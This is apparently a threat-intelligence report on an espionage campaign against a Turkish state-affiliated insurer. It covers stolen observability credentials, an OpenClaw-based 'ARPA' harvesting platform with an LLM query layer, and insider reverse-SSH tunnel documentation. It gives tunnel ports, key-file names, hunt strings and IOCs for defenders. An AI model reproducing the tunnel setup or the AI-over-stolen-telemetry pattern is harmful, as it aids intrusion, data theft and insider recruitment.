---
title: "Turkish ARPA Operator — AI-Augmented State-Insurer Observability Compromise + Insider Recruitment Artifact (UTA-2026-013)"
date: '2026-05-25'
layout: post
permalink: /reports/turkish-arpa-openclaw-state-insurer-209.38.205.158/
thumbnail: /assets/images/cards/turkish-arpa-openclaw-state-insurer-209.38.205.158.png
hide: true
unlisted: true
sponsored_by: hunt-io
category: "AI-Augmented Espionage"
description: "Technical analysis of an active compromise of a state-affiliated Turkish financial-sector organization: a Turkish-speaking operator weaponizes the OpenClaw AI agent platform into a custom analytics platform (ARPA) to harvest the victim's enterprise observability stack across four stolen sources (IBM Instana + SolarWinds Orion + Zabbix + VMware Aria), and authors Turkish-language insider-recruitment documentation to an in-network Windows AD user. UTA-2026-013 — first public attribution."
detection_page: /hunting-detections/turkish-arpa-openclaw-state-insurer-209.38.205.158-detections/
ioc_feed: /ioc-feeds/turkish-arpa-openclaw-state-insurer-209.38.205.158-iocs.json
detection_sections:
  - label: "Detection Coverage Summary"
    anchor: "detection-coverage-summary"
  - label: "YARA Rules"
    anchor: "yara-rules"
  - label: "Sigma Rules"
    anchor: "sigma-rules"
  - label: "Suricata Signatures"
    anchor: "suricata-signatures"
  - label: "Coverage Gaps"
    anchor: "coverage-gaps"
ioc_highlights:
  - "209.38.205.158"
  - "ee5428e9b47fd102d27d3dcc804b10512100acd21399969efe39e201e61cbf79"
  - "65d2eb26067c3df4b139b02145bdba2065be5a403f38ad096f886230b41fda9b"
  - "9928277dbbfbdf95a5f4e98ef99e55b7d87093982dbdd298be16b232bfc39c77"
  - "a4b39f13d17ae3ff7a0adb2cf1df459a72425513f392a1d8fc469f8f2e123de5"
---

**Campaign Identifier:** Turkish-ARPA-OpenClaw-State-Insurer-UTA-2026-013-209.38.205.158<br>
**Last Updated:** May 27, 2026<br>
**Threat Level:** CRITICAL

> **Part of series:** This is sub-report 3 of 6 in the parent investigation [AI-Agent-Frameworks-MultiActor-2026-05-23](/reports/ai-agent-frameworks-2026-05-23/). The parent report synthesizes the cross-case findings across eight operator cases; this sub-report provides the operator-specific technical deep-dive for **Case 2 — the Turkish-speaking operator weaponizing the OpenClaw AI agent platform against the victim organization's enterprise observability stack and recruiting a named insider via operator-authored Turkish-language tunnel-setup documentation.**

> **Operational sensitivity (read first):** This report contains intentional redactions for operational-sensitivity reasons. Specific victim-side identifiers (insider Windows AD user ID, internal infrastructure detail beyond domain-level) and operator-side identifiers (operator residential IP precise value, operator GitHub repository URL) are **suppressed** from the public report body. The full identifiers are held in an offline evidence-handoff briefing for victim-organization IR coordination use only. Defenders or victim-org IR teams requiring the complete evidence package can request it via the USOM (TR-CERT) PGP-encrypted channel. The structured IOC feed contains every operator-side indicator at full fidelity for SIEM / EDR ingestion; the public report body redacts victim-PII only.

---

## 1. Executive Summary

A Turkish-speaking operator is actively running a custom intelligence-collection platform against a **state-affiliated Turkish financial-sector victim**, built entirely on stolen monitoring credentials. The operator weaponized the OpenClaw AI agent framework into a self-branded analytics platform — `ARPA Korelasyon Motoru` ("ARPA Correlation Engine") — that cross-correlates **four stolen enterprise observability sources** (IBM Instana, SolarWinds Orion, Zabbix, VMware Aria) into a single 7,552-element view of the victim's internal infrastructure, and recruited a named in-network insider via operator-authored Turkish-language reverse-SSH-tunnel documentation. Every dimension is documented from primary-source artifacts pulled directly from the operator's open-directory-exposed VPS at `209.38.205.158` (DigitalOcean Frankfurt, AS14061) — not from downstream effects. This is an **active, named-victim, insider-in-chain** compromise: the credential-rotation timeline is the remediation timeline, and it is currently running.

What is new about this case is the convergence: no public reporting documents a sustained four-source observability reverse-pipeline cross-correlated against a single named state-affiliated victim, paired with an operator-recruited insider surfaced by third-party detection before the victim's own. For cross-case campaign context, see the parent report (linked above); this sub-report owns the operator-specific forensic depth.

### What Was Found

Each finding below names the artifact and points to its home section; the deep analysis lives there.

- **A four-source observability reverse-pipeline against one victim (§4.2, §4.5).** A 5-daemon production-grade Python ETL platform (TimescaleDB + Neo4j + Redis + SQLite) cross-correlates stolen Instana, SolarWinds Orion, Zabbix, and VMware Aria credentials into a 7,552-element unified topology graph spanning 1,859 victim hosts — HIGH confidence, derived from the operator's own export files.
- **A 10-year IBM Instana JWT — the headline credential governance defect (§4.2).** jti `022a1b74-...-7ae3`, tenant `[victim-tenant]`, issued 2024-03-06, expiring approximately 2034-02. The unrotated lifetime is a customer-side governance failure, not an IBM Instana CVE.
- **An operator-recruited insider with operator-deployed reverse-SSH tunnel (§4.4).** Eight Turkish-language Markdown documents instruct a named victim-organization Windows AD user (identifier suppressed) to deploy a reverse-SSH tunnel (operator VPS `:18080` → insider `localhost:8089`) using operator-supplied SSH keys and the `ARPA_Tunnel` PuTTY session. Whether the tunnel is currently active requires victim-side forensic access.
- **An AI-augmented natural-language query interface over stolen telemetry — CANDIDATE novel TTP at N=1 (§4.6).** `ai_service.py` + `ai_assistant.db`, backed by Moonshot AI's Kimi rather than a Western LLM (a Trust-and-Safety-evasion choice). Architecturally documented; operational state is dev-stage.
- **A Turkish residential ISP source captured live (§4.8, §9).** The operator's interactive source IP (suppressed from this body; full value in the IOC feed) resolves to TurkNet AS12735, Istanbul area, captured 2026-05-20 21:22–21:30 UTC (00:22–00:30 local) with no VPN/Tor masking.
- **Partner-ecosystem entities in notification scope, NOT separate compromises (§4.7).** Six partner entities plus one subsidiary appear as integration endpoints visible through the victim's own monitoring — including a disproportionate ~85 KB deep-dive on a sanctions-exposed major Turkish state bank. Mischaracterizing this as a 7-victim compromise would misdirect defender allocation.

### Why This Threat Is Significant

Three findings distinguish this case from existing public reporting. Each is dissected in its home section; the defender takeaway leads here.

**The four-source Observability-Tool Reverse Pipeline has no documented prior art at this scale (§4.2, §13).** No published case documents an operator stealing credentials for four enterprise observability platforms and cross-correlating them against a single named victim with a production-grade ETL pipeline sustained 73+ days. SolarWinds Sunburst (a vendor supply-chain compromise) and UNC6395 (one-time OAuth CRM exfiltration) are structurally distinct. **Defender takeaway:** treat monitoring-platform credentials as crown-jewel-class secrets with domain-admin-grade rotation timelines. Detection: `Sigma rule 7` + `Suricata rule 2`.

**Third-party detection of an operator-recruited insider before the victim's own is structurally rare (§4.4, §13).** The 2024–2026 insider-threat corpus contains internal-detection-first cases (Rippling/Deel, Coinbase) but none combining all four structural factors here: third-party open-directory scan surfaces the operator-to-insider artifacts, single state-affiliated corporate victim, named insider identifiable from operator documentation, and a 70+ day discovery-to-presumed-awareness gap. **Defender takeaway:** insider-recruitment artifacts authored externally never touch victim infrastructure until deployment, so victim-side detection is structurally hard — operator open-directory exposures are a primary-source attribution channel for them.

**The AI-augmented natural-language query interface over stolen telemetry is a CANDIDATE novel TTP at N=1 (§4.6, §13).** It is a fourth, distinct pattern alongside the parent campaign's three AI-offensive patterns (AI-generated code, AI workflow orchestration, AI permission-allowlist customization). Operational state is dev-stage, but the architecture is in the operator's workflow inventory. **Defender takeaway:** the LLM-as-intelligence-analyst-over-stolen-victim-telemetry class is straightforward to replicate; preparation is warranted now.

### Key Risk Factors

The risk framing reflects what the campaign has currently configured — operator-controlled 10-year JWT, stolen credentials across four observability platforms, in-network insider with operator-deployed reverse-SSH tunnel — not abstract capability claims.

<table>
<colgroup>
<col style="width: 26%;">
<col style="width: 14%;">
<col style="width: 60%;">
</colgroup>
<thead>
<tr><th>Risk Dimension</th><th>Score</th><th>Rationale</th></tr>
</thead>
<tbody>
<tr><td>Active Victim Compromise</td><td>10/10</td><td>Stolen 10-year Instana JWT still valid (issued 2024-03-06, expiring approximately 2034-02 — the unrotated lifetime is the credential governance defect); stolen SolarWinds Orion, Zabbix, and VMware Aria credentials all confirmed in active operator code; 5 systemd daemons polling on a 5-minute cadence as of 2026-05-23 daily-topology log; insider reverse-SSH tunnel documentation operationally configured. A state-affiliated Turkish financial-sector victim, with ecosystem-partner integrations visible through the victim's own observability stack.</td></tr>
<tr><td>Stolen Credential Persistence</td><td>10/10</td><td>The Instana JWT is the headline credential governance defect: a single token with a 10-year lifetime that the victim does not appear to have rotated since the operator obtained it. Three additional stolen credential sources (SolarWinds Orion, Zabbix, VMware Aria) each provide independent reverse-pipeline access. Credential rotation across four observability platforms is the most operationally complex remediation single dimension of this case.</td></tr>
<tr><td>Insider-in-Chain Risk</td><td>9/10</td><td>Named victim-organization Windows AD user with operator-authored Turkish-language tunnel-setup documentation and operator-supplied SSH keys. Insider intent classification (cooperative / coerced / deceived / compromised-account) cannot be determined from external evidence; victim-side forensic access is required. The insider-in-chain dimension makes any victim-side investigation legally and operationally sensitive.</td></tr>
<tr><td>Detection Evasion</td><td>6/10</td><td>The operator's tradecraft is selectively sophisticated: production-grade ETL platform plus discipline to avoid VPN-traceable infrastructure (residential ISP) plus deliberate non-Western LLM provider choice (Moonshot AI / Kimi). At the same time, OPSEC discipline is uneven: open-directory exposure on the operator VPS allowed all 780 file artifacts including the JWT to be enumerated externally; the operator's GitHub handle is a partial real-name match; the residential ISP source IP has no VPN / Tor masking. Net: detection evasion is sufficient against typical victim-side automated monitoring but is failing against external threat-intelligence open-directory surveillance.</td></tr>
<tr><td>Cross-Source Correlation Capability</td><td>9/10</td><td>7,552-element unified-topology graph derived from four cross-correlated observability sources gives the operator a structural view of victim infrastructure at a granularity comparable to a privileged internal architecture diagram. Combined with the AI-augmented natural-language query interface (CANDIDATE novel TTP) and Isolation Forest / DBSCAN / LOF anomaly-detection modules over 1,859 victim hosts, the operator's intelligence-analysis throughput on stolen telemetry is meaningfully higher than commodity exfiltration-then-analyze baseline.</td></tr>
<tr><td>Ecosystem Cascade Scope</td><td>7/10</td><td>Six ecosystem-partner entities (several regulated-sector partners) plus one subsidiary ([victim subsidiary]) appear in operator topology data via the victim organization integrations. These are partner-notification scope (not separate compromises) — but a selective, disproportionate deep-dive into one partner — a major Turkish state bank with sanctions-related geopolitical exposure — is consistent with geopolitical-leverage targeting interest.</td></tr>
</tbody>
</table>

**Overall Campaign Risk Score: 9.5/10 — CRITICAL.** The campaign is rated CRITICAL based on the convergence of three concurrent CRITICAL-class factors: (1) an active stolen-credential compromise of a state-affiliated corporate victim with credentials that the victim has not rotated for 70+ days since third-party discovery; (2) an in-network insider with operator-authored documentation and operator-supplied SSH keys whose intent cannot be determined externally; (3) a publication-defining novel TTP set (Observability-Tool Reverse Pipeline + Insider Recruitment with operator-authored documentation + CANDIDATE AI-Augmented Reconnaissance) with no documented prior art at this combination. The threat level should be reassessed downward only after **all four stolen credential sources are rotated**, **the insider's account is segregated and forensically reviewed**, and **the operator VPS is taken down via DigitalOcean abuse coordination sequenced after USOM and victim notification**.

### Threat Actor Summary

This is a **single-operator** case tracked as **UTA-2026-013** *(an internal tracking label used by The Hunters Ledger — see Section 9)*. This report is the first public attribution; no prior vendor coverage exists (full cross-vendor naming check in §9).

- **UTA-2026-013** — high-MODERATE 78% within the canonical MODERATE band (70–85%). Turkish-speaking, Turkish-located, intra-Turkey single-thread operator. Five-axis Turkish convergence (language + handle + self-branding + target + residential ISP) is the strongest single-dimension attribution evidence in the entire parent campaign. Espionage tradecraft pattern at HIGH confidence (85%) based on 73+ day patient dwell + 780-file zero-monetization sweep across all operator artifacts. Sub-type classification: state-aligned-loosely-controlled (~40%) and political/factional intelligence (~35%) are tied at the MODERATE high-end within the band; commercial / hire-for-spy / insurance-fraud-prep / criminal-opportunist are effectively ruled out by the zero-monetization sweep. Real-world identity remains **INSUFFICIENT** — the public GitHub handle (`MehmetARPA`) is preserved as a behavioral IOC only and is not a real-name identification. The handle's surname is a real Turkish surname, "Mehmet" is among the most common Turkish given names, and `ARPA` is the operator's self-branded codename for the analytics platform; three competing handle-interpretation hypotheses remain indistinguishable from current evidence.

### For Technical Teams

Full detection-coverage map and response orientation are in §10 and the linked detection file. The highest-signal starting points:

- **Detection:** the multi-platform cross-source authentication pattern (same source IP against ≥2 observability platforms in a short window) is the diagnostic signature of the Observability-Tool Reverse Pipeline TTP — `Sigma rule 7` + `Suricata rule 2`. Operator self-branding string `ARPA Korelasyon Motoru` is a near-zero-FP YARA detection (`YARA rule 1`).
- **Hunt:** `/opt/ARPA/` filesystem tree; co-located `~/.openclaw/` + `~/.clawdbot/` (discriminator from legitimate OpenClaw dev environments); `arpa-*.service` unit files; JWT jti `022a1b74-2332-4df5-a76b-60225ffa7ae3` in any artifact; PowerShell `Invoke-RestMethod -SkipCertificateCheck` against `ocpinstana.[victim-domain].com.tr`.
- **Victim mitigation:** rotate all four observability credential sources in parallel; segregate and forensically review the named insider account; block egress to `209.38.205.158` ports 22, 8089, 8090, 8095, 8096.
- **Broader-customer governance:** audit long-lived monitoring API tokens (`Sigma rule 6` flags JWTs with `exp ≥ 1 year`); review audit logs for any source-IP authenticating against multiple observability platforms from outside the admin allow-list.

For executives reading only this section: the ARPA platform is a textbook case of **stolen monitoring credentials weaponized as intelligence-collection infrastructure against the victim itself**. The takeaway is not "block AI" or "block observability" — both are legitimate tools — but **treat monitoring-platform credentials as crown-jewel-class secrets with admin-token-grade rotation and source-IP allow-listing**.

---

## 2. Business Risk Assessment

This is a sustained, multi-source observability-data exfiltration campaign against a state-affiliated Turkish corporate victim with an in-network insider configured at capture time — not a one-off incident. The risk is twofold: the **immediate-victim risk** (the victim's stolen-credential remediation timeline is actively running), and the **broader-class risk** for any organization with a comparable observability stack (IBM Instana on OCP + SolarWinds Orion + Zabbix + VMware Aria) lacking source-IP allow-listing and admin-token-grade rotation on monitoring credentials.

### Understanding the Real-World Impact

The captured arsenal tells defenders what the operator does with stolen credentials. Five outcomes are observable in the artifacts; each is dissected in §4:

1. **Sustained four-platform observability theft, cross-correlated (§4.2, §4.5).** Five daemons poll Instana, SolarWinds Orion, Zabbix, and VMware Aria on a 5-minute cadence into a 7,552-element unified topology — a privileged-internal-architecture-grade view of the victim, running 73+ days continuously.
2. **Selective deep-dive on a sanctions-exposed ecosystem partner (§4.7).** A disproportionate ~85 KB Instana snapshot of one major Turkish state bank, within the 43-application set, is consistent with geopolitical-leverage targeting interest rather than ordinary financial crime.
3. **AI-augmented internal intelligence consumption (§4.6).** Isolation Forest / DBSCAN / LOF anomaly detection over 1,859 hosts, plus a Kimi-backed natural-language query interface (`ai_service.py`) architecturally intended for English/Turkish questions over the stolen telemetry. Operational maturity is dev-stage.
4. **In-network insider with operator-deployed reverse-SSH tunnel (§4.4).** A second access path independent of the stolen tokens: if the tokens are rotated, the tunnel persists; if the tunnel is severed, the tokens persist. Dual-path access is a deliberate tradecraft choice.
5. **Partner-ecosystem visibility through the victim's own stack (§4.7).** Six partner entities plus one subsidiary appear as integration endpoints because they are integrated with the victim — notification scope, not compromise scope. Mischaracterizing them as separate compromises will misrepresent the campaign.

### Operational Impact Timeline (If Your Organization Is the Victim)

The phases below describe **categories of work** in priority order. Per The Hunters Ledger's third-party perspective, no organization-specific procedures, vendor configurations, compliance timelines, or cost estimates are included — those belong to the responding organization's IR team and outside counsel.

- **Phase 1 — Credential rotation across all four platforms.** Rotate Instana, SolarWinds Orion, Zabbix, and VMware Aria credentials in parallel; sequential rotation gives the operator a window to re-establish access via the not-yet-rotated platform.
- **Phase 2 — Insider account segregation and forensic review.** Segregate the named Windows AD account, forensically image the workstation (memory + disk + browser + SSH client artifacts), and assess intent classification. Coordinate through General Counsel and HR, not operational SOC channels, given the insider-in-chain risk and legal-evidentiary requirements.
- **Phase 3 — Reverse-SSH tunnel disruption.** Block outbound SSH to `209.38.205.158:22`; audit internal SSH client configs for the `ARPA_Tunnel` saved session and `rca_key.ppk` / `rca_key.pem`; remove operator-supplied keys wherever they appear.
- **Phase 4 — Forensic enumeration of operator-accessed scope.** Reconstruct the operator's access pattern across all four platforms (endpoints, time windows, data volumes), the unified-topology state, and the sanctions-exposed-partner deep-dive scope. Requires direct access to each platform's audit log.
- **Phase 5 — Partner-ecosystem notification.** Notify the six partner entities and one subsidiary that they appear as integration endpoints in the operator-accessed topology. Sequence after victim-side rotation completes.
- **Phase 6 — Monitoring credential governance audit.** Audit token lifetime (rotate any token with `exp ≥ 1 year`), source-IP allow-listing, and provisioning (verify no token was issued outside the documented admin operator).
- **Phase 7 — Long-term observability-stack hardening.** Admin-token-grade rotation (≤90-day) for all monitoring credentials; source-IP allow-listing as default; multi-source cross-platform authentication as a standing SIEM correlation rule.

### Impact Scenarios

Each scenario below derives from observed operator capabilities and infrastructure — **observable** in the captured artifacts, not speculative.

| Scenario | Likelihood | Explanation |
|---|---|---|
| Continued silent exfiltration of the victim organization observability data | HIGH | The five operator systemd daemons were polling on 5-minute cadence as of 2026-05-23. Until the four stolen credential sources are rotated and the insider tunnel is severed, exfiltration continues regardless of any other remediation action. |
| Selective sanctions-exposed-partner intelligence collection via the victim-organization integration | HIGH | The operator's disproportionate deep-dive into one partner — a major Turkish state bank with well-documented, sanctions-related geopolitical exposure — is structurally selective; geopolitical-leverage targeting is the most plausible explanation. The defender implication: that partner's exposure as an integration endpoint to the victim organization carries downstream geopolitical-intelligence risk independent of its own security posture. |
| Insider lateral movement under cover of legitimate AD activity | MODERATE | Operator-supplied SSH keys + reverse-SSH tunnel + insider account inside victim AD provides the operator with an alternative access path that can persist after stolen-token rotation. Whether the tunnel was actually deployed by the insider cannot be confirmed externally. |
| Diffusion of the Observability-Tool Reverse Pipeline TTP to other operators | MODERATE | The TTP is now publicly documented (this report). The operator-side infrastructure is approximately one production-grade Python application (5 daemons + 4 databases). Adoption by other operators who steal observability tokens is plausible within months. Defender preparation for the broader class of multi-source observability-credential abuse is warranted. |
| AI-Augmented Infrastructure Reconnaissance TTP reaching CONFIRMED novel status | MODERATE | Currently CANDIDATE at N=1 (this case). If a second independent operator is documented deploying an LLM-backed natural-language query interface over stolen victim telemetry, the TTP graduates to CONFIRMED. The architectural pattern is straightforward to replicate; cross-operator validation is the gating constraint, not technical complexity. |
| Operator real-world identity disclosed via TurkNet subscriber-record subpoena | MODERATE | The TurkNet AS12735 capture window (2026-05-20 21:22–21:30 UTC) is sufficiently narrow for subpoena-grade subscriber-record disclosure if Turkish law enforcement (SECRD Cybercrime Combat Department) is engaged via USOM coordination. Specific operator residential IP value suppressed from this public report body — full value in the offline FULL briefing and the structured IOC feed. The 2025 TurkNet breach disclosure (2.8M records) creates a separate question about subscriber-record evidentiary integrity; that question is unresolved at investigation date. |
| the victim organization General Counsel litigation against the operator following identity disclosure | MODERATE | State-fund-portfolio companies have legal-action history when faced with documented external operator compromises. Civil action against a Turkish-resident identified operator is administratively feasible if real-world identity is confirmed. |

---

## 3. Technical Classification

The ARPA platform is operator-built custom tooling, not a commodity malware family or a derivative of any publicly known kit. Classification draws on the operator's own self-branding (`ARPA Korelasyon Motoru` appears in code docstrings, dashboard footer, and the GitHub repository name), the architectural composition (5 systemd daemons + 4 persistence backends), and the operator's deliberate adoption of the OpenClaw AI agent framework as the upstream substrate.

<table>
<colgroup>
<col style="width: 28%;">
<col style="width: 32%;">
<col style="width: 40%;">
</colgroup>
<thead>
<tr><th>Attribute</th><th>Value</th><th>Confidence / Evidence</th></tr>
</thead>
<tbody>
<tr><td>Classification</td><td>Observability-data harvester platform + operator-recruited insider toolkit + custom analytics ETL</td><td>DEFINITE — self-branded by operator</td></tr>
<tr><td>Family</td><td>ARPA Korelasyon Motoru (operator-built; not derivative)</td><td>DEFINITE — appears in `correlation_v3.py` docstring + dashboard footer + GitHub repository name + systemd unit naming</td></tr>
<tr><td>Upstream substrate</td><td>OpenClaw AI agent framework</td><td>HIGH — `~/.openclaw/` and `~/.clawdbot/` directories present on operator host alongside ARPA-specific code</td></tr>
<tr><td>Sophistication</td><td>Advanced</td><td>HIGH — production-grade Python application with 5 systemd daemons, 4-backend persistence, 7,552-element unified topology graph, AI-augmented query layer, AI/ML anomaly-detection modules</td></tr>
<tr><td>Threat actor type</td><td>Single operator (individual or small team)</td><td>MODERATE — single-VPS no-diversity architecture + late-evening working hours + residential ISP source consistent with individual operator; state-aligned-vs-political-factional sub-type INSUFFICIENT</td></tr>
<tr><td>Primary motivation</td><td>State-aligned-or-political espionage targeting state-affiliated financial-sector intelligence</td><td>MODERATE — 780-file zero-monetization sweep formally rules out commercial sub-types; sub-types (a) state-aligned-loosely-controlled (~40%) and (c) political/factional (~35%) tied at MODERATE high-end</td></tr>
<tr><td>Target profile</td><td>A Turkish state-affiliated corporate observability stack with ecosystem-partner integration visibility</td><td>DEFINITE — the victim organization is state-affiliated + observable partner-integration endpoints in operator data</td></tr>
<tr><td>Campaign active as of</td><td>2026-05-23 (most recent daily-topology log)</td><td>DEFINITE — daily-topology log generation date present in operator filesystem</td></tr>
<tr><td>First seen (operator-side)</td><td>2026-03-14 (Hunt.io initial open-directory indexing)</td><td>HIGH — Hunt.io indexed the operator open-directory exposure</td></tr>
<tr><td>Earliest fetch in operator data</td><td>2026-03-12 (Instana data with this fetch timestamp)</td><td>HIGH — observed in operator-captured Instana data, 2-day pre-indexing window suggests operator was operational before Hunt.io discovery</td></tr>
<tr><td>Sample count</td><td>~780 file artifacts in operator open directory</td><td>DEFINITE — file enumeration from Hunt.io scan</td></tr>
</tbody>
</table>

### File and Component Identifiers

The operator's open directory contains approximately 780 artifacts. The linked IOC feed carries 13 SHA256 file hashes: 12 DEFINITE-confidence operator-authored Python source code modules at the core of the ARPA platform, plus 1 MODERATE-confidence ecosystem-template file (`SOUL.md`, a default Hermes/OpenClaw persona file present across developer environments — see feed for false-positive guidance). Hash inventory and per-file context are in the structured IOC feed at `/ioc-feeds/turkish-arpa-openclaw-state-insurer-209.38.205.158-iocs.json`. The highest-confidence file artifacts are:

- `topology_mapper.py` — Instana topology collector (Turkish docstring + hardcoded JWT)
- `instana_collector_v4.py` — event collector iteration v4 (same JWT)
- `correlation_v3.py` — cross-source correlation engine v3 (operator self-branding docstring "ARPA Korelasyon Motoru v3 - Temporal Focus")
- `api_correlation_routes.py` — Flask API routes for correlations / events (Turkish comments throughout)
- `ai_service.py` — Moonshot AI / Kimi-backed natural-language query service (CANDIDATE novel TTP architectural anchor)
- The 5 systemd unit files (`arpa-autolearn.service`, `arpa-continuous.service`, `arpa-daemon.service`, `arpa-instana-api.service`, `arpa-parallel.service`)
- The victim-side PowerShell collector script (`turkish-instana_local_collector.ps1` — designed for insider deployment, not bundled)

### Sophistication Indicators

Three observations justify the "Advanced" sophistication classification:

1. **Production-grade multi-daemon architecture.** Five concurrent systemd daemons coordinating on shared TimescaleDB + Neo4j + Redis + SQLite stores demonstrate operator capability with production system administration, not just scripting. The systemd unit naming convention (`arpa-autolearn`, `arpa-continuous`, etc.) is consistent and intentional.
2. **Cross-source ETL with 4-backend persistence stack.** TimescaleDB for time-series + Neo4j for topology graph + Redis for cache + SQLite for collector state is a deliberate 4-database architecture choice. The unified-topology graph spans 7,552 elements correlating events across all four observability sources — this is not commodity data-staging tooling.
3. **AI/ML anomaly detection over 1,859 victim hosts.** Isolation Forest, DBSCAN, and Local Outlier Factor are implemented as anomaly-detection methods over the operator's stolen-telemetry corpus. The AI-augmented natural-language query interface (`ai_service.py` + `ai_assistant.db`) extends this with an LLM layer for interactive query — a CANDIDATE novel TTP.

Counter-evidence that limits the sophistication rating from reaching "Sophisticated / Nation-State":

1. **Open-directory exposure was the discovery vector.** The operator failed to apply directory-listing-off configuration to the operator VPS — a basic OPSEC step. Hunt.io indexed the exposure on 2026-03-14 and the operator selectively closed port 8098 (code exposure) approximately the same date, but left ports 8090 and 8095 (dashboard + topology) open through 2026-05-23.
2. **Residential ISP source without VPN / Tor.** The captured operator session on 2026-05-20 originated from a TurkNet residential / SMB ISP IP with no VPN, Tor, or commercial proxy layer between operator and victim infrastructure. This is consistent with either OPSEC failure or non-professional individual operator pattern; it is inconsistent with disciplined state-intelligence tradecraft.
3. **Public GitHub handle.** The operator's GitHub handle (`MehmetARPA`, attributed by self-branding match) is a partial real-name overlap with the project codename, which would not occur in disciplined cover-identity tradecraft.

The net classification is **Advanced operator with selectively sophisticated platform engineering and selectively poor OPSEC discipline** — a profile consistent with state-adjacent or politically-motivated independent operator rather than professional state-intelligence unit.

---

## 4. Capabilities Deep-Dive

> **Executive Impact Summary:** The ARPA platform's eight capability surfaces (4.1–4.8) function together as an integrated intelligence-analyst pipeline over stolen victim telemetry. Three are the defender priorities: 4.2 (4-source Observability-Tool Reverse Pipeline novel TTP), 4.4 (insider-recruitment artifact), and 4.6 (AI-Augmented Infrastructure Reconnaissance, CANDIDATE novel TTP). Subsections 4.1, 4.3, 4.5, 4.7, and 4.8 provide architectural context for those three.

### 4.1 ARPA Korelasyon Motoru Platform Architecture

> **Analyst note:** This subsection describes the operator-built ARPA application — its five concurrent system daemons, its four data persistence backends, and its dashboard / API endpoints. Understanding the platform architecture matters because it is the substrate on which every other operator capability runs. The architecture is production-grade: it is not a script-kiddie pile of cron jobs but a coordinated multi-daemon Python application stack with persistent state across four database technologies.

#### Deep Technical Analysis

The ARPA platform is deployed at `/opt/ARPA/` on the operator VPS `209.38.205.158` (DigitalOcean Frankfurt, AS14061). An earlier project path `/opt/rca-platform/` is preserved on the same host (operator naming-history artifact). Five systemd unit files coordinate the daemons:

| Systemd unit | Role |
|---|---|
| `arpa-instana-api.service` | HTTP API endpoint exposure (port 8090 dashboard + port 8095 unified-topology API + port 8096 ingestion API) |
| `arpa-daemon.service` | Primary collector daemon orchestrating per-source polling |
| `arpa-continuous.service` | Continuous-mode polling daemon (5-minute cadence) |
| `arpa-autolearn.service` | AI/ML anomaly-detection runner over collected data |
| `arpa-parallel.service` | Parallel cross-source ETL worker |

Four data persistence backends:

| Backend | Role |
|---|---|
| TimescaleDB | Time-series storage for Instana events, metric snapshots, and SolarWinds counters |
| Neo4j | Topology graph storage for cross-source unified topology (7,552 elements) |
| Redis | Cache layer for hot-path queries and rate-limited polling state |
| SQLite (`/opt/ARPA/data/collector.db` + `/opt/ARPA/data/ai_assistant.db`) | Collector run-state, configuration, and AI assistant query history |

Public-facing dashboard footer (string-confirmed in dashboard HTML response):

```
ARPA © 2026 the victim organization | Read-Only Compliance | Mock Data: ❌
```

The footer contains three operator-tradecraft signals: (1) explicit attribution to the victim organization in the operator-facing dashboard (self-evidence that the operator considers the platform "for" the named victim); (2) "Read-Only Compliance" framing — the operator presents the platform internally as a read-only analytics tool, consistent with a non-destructive intelligence-collection posture; (3) "Mock Data: ❌" (with the explicit emoji glyph) — operator emphasis on data realness, consistent with an internally-shared tool where other operators or customers would otherwise default to assuming the data is synthetic (MODERATE-confidence interpretation based on dashboard-footer convention).

#### Executive Technical Context

**What This Means:** The ARPA platform is not malware in the traditional sense — there is no binary payload, no exploit, no persistence implant on victim systems. The platform runs entirely on operator-controlled infrastructure (the DigitalOcean VPS) and uses **stolen credentials** to pull data from the victim's own enterprise monitoring tools. This is operationally equivalent to a fraudster using stolen banking credentials to log into the bank's own portal and read account history — the platform "abuse" is the unauthorized use of legitimate credentials, not the deployment of malicious code.

**Business Impact:** Traditional antivirus / endpoint detection cannot see this campaign on victim infrastructure because nothing runs on victim infrastructure that the operator controls (except for the insider's reverse-SSH tunnel, addressed in subsection 4.4). Detection must occur at the **observability-platform audit layer** (Instana / SolarWinds / Zabbix / VMware Aria audit logs showing unauthorized source-IP authentication) or at the **SIEM cross-platform correlation layer** (multiple observability platforms authenticated from the same external IP in a short time window).

**Detection Strategy:** See `Sigma rule 7` and `Suricata rule 2` in the linked detection file. The diagnostic signature is: same source IP authenticating against ≥2 of {Instana, SolarWinds, Zabbix, Datadog, NewRelic, VMware Aria, Dynatrace, Prometheus} within a short time window (recommended initial threshold: 10 minutes).

### 4.2 Observability-Tool Reverse Pipeline — Novel TTP at Maximalist Scale

> **Analyst note:** This subsection covers the campaign's headline novel TTP. The operator did not steal one observability credential — the operator stole **four**, all from the same victim, and built a sustained ETL pipeline cross-correlating data across all four. The closest documented adjacent case (UNC6395 OAuth-based CRM breach against Salesforce in 2025) is structurally distinct: that case was one-time exfiltration affecting many tenants; this case is sustained ETL against a single named tenant. The SolarWinds Sunburst case is **not** comparable — Sunburst was a supply-chain compromise against the vendor's update infrastructure, not a stolen-credential reverse pipeline against the vendor's customer. After full prior-art review (Tier-1 vendor reports + Tier-2 vendor catalogs through 2024–2026), novelty is maintained at the top of the MODERATE band.

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/turkish-arpa-openclaw-state-insurer-209.38.205.158/arpa-observability-reverse-pipeline.svg" | relative_url }}" alt="Hybrid infographic showing the Observability-Tool Reverse Pipeline TTP. Four stolen credential source cards are arranged in a 2×2 grid at the top, each with a yellow side-rail. Top-left: IBM Instana — 10-year JWT (issued 2024-03-06, expires approximately 2034-02), JWT ID 022a1b74-2332-4df5-a76b-60225ffa7ae3, tenant [victim-tenant], endpoint ocpinstana.[victim-domain].com.tr, used by the operator for 73+ days continuous polling. Top-right: SolarWinds Orion — stolen service-account credential capturing 784 nodes and 6,566 interfaces in the snapshot solarwinds_topology_20260312_1015.json (NOT Sunburst — stolen-credential abuse against the vendor's customer, not supply-chain compromise against the vendor). Bottom-left: Zabbix — stolen admin or read-only token capturing 100 victim hosts in zabbix_topology_20260312_2058.json (token held in environment variables, not in the open-directory capture). Bottom-right: VMware Aria — vCenter and ESXi monitoring API access capturing 8,649 events spanning three internal-domain spaces (production AD, Linux estate, and a VMware-managed cluster; specific names suppressed). Convergence arrows from all four source cards point down into a single ARPA platform card with a red side-rail and deep-red border (the operator-built cross-source ETL): ARPA Korelasyon Motoru, a Python + TimescaleDB + Neo4j + Redis platform running 5 systemd daemons (arpa-autolearn, arpa-continuous, arpa-daemon, arpa-instana-api, arpa-parallel) with a 5-minute polling cadence and a cross-source correlation layer linking Instana service-IDs to SolarWinds node-IDs to Zabbix host-IDs to VMware Aria VM-IDs, plus an AI-augmented natural-language query interface (ai_service.py + ai_assistant.db) flagged as a CANDIDATE novel TTP at N=1. 